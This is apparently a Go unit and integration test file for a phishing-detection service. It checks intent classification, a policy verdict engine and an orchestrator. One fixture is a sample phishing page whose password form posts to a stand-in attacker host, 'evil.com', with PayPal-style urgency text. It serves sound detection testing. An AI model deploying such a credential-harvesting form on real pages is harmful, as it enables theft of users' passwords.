package analysis

import (
	"context"
	"testing"
	"time"

	"github.com/PhishVault/PhishVault-2/core/domain"
	"github.com/PhishVault/PhishVault-2/services/analysis/ai"
	"github.com/PhishVault/PhishVault-2/services/analysis/decision"
)

// Unit Tests for Components

func TestTextPipeline(t *testing.T) {
	ai.InitBayesian() // Ensure model is loaded

	html := `
		<html>
		<form action="http://evil.com/post.php">
			<input type="password" name="pass">
		</form>
		<p>Verify your account immediately or it will be suspended.</p>
		</html>
	`
	text := "Verify your account immediately or it will be suspended."
	risk := ai.AnalyzeContent(html, text, "paypal.com")

	t.Logf("Pipeline Result: Intent=%s, Score=%f, FormRisk=%+v", risk.Intent, risk.UrgencyScore, risk.FormRisk)

	if risk.Intent != "CredentialHarvesting" {
		t.Errorf("Expected CredentialHarvesting, got %s", risk.Intent)
	}
	if !risk.FormRisk.HasPassword {
		t.Error("Failed to detect password field")
	}
}

func TestOPA(t *testing.T) {
	// Malicious input
	input := decision.PolicyInput{
		VisualMatchScore: 0.9,
		UrgencyScore:     0.8,
		Intent:           "CredentialHarvesting",
		HasLoginForm:     true,
		DomainAgeDays:    5,
	}

	result, err := decision.EvaluateVerdict(context.Background(), input)
	if err != nil {
		t.Fatalf("Evaluation failed: %v", err)
	}

	t.Logf("OPA Result: Verdict=%s, Risk=%f", result.Verdict, result.RiskScore)

	if result.Verdict != "MALICIOUS" {
		t.Errorf("Expected MALICIOUS, got %s", result.Verdict)
	}
}

// Integration Test for Orchestrator

func TestOrchestratorIntegration(t *testing.T) {
	orch := NewOrchestrator()

	// Create a "Phishing" SAL
	input := domain.SAL{
		ScanID:    "test-scan-integration",
		URL:       "http://login-update.com",
		FinalURL:  "http://login-update.com",
		Timestamp: time.Now(),
		Response:  domain.ResponseDetails{
			// FinalUrl moved to SAL root
		},
	}

	result, err := orch.ProcessArtifact(context.Background(), input)
	if err != nil {
		t.Fatalf("Orchestrator failed: %v", err)
	}

	t.Logf("Orchestrator Processed Artifact. Verdict: %s", result.Verdict)
	t.Logf("Generated Signals: %d", len(result.Signals))
}
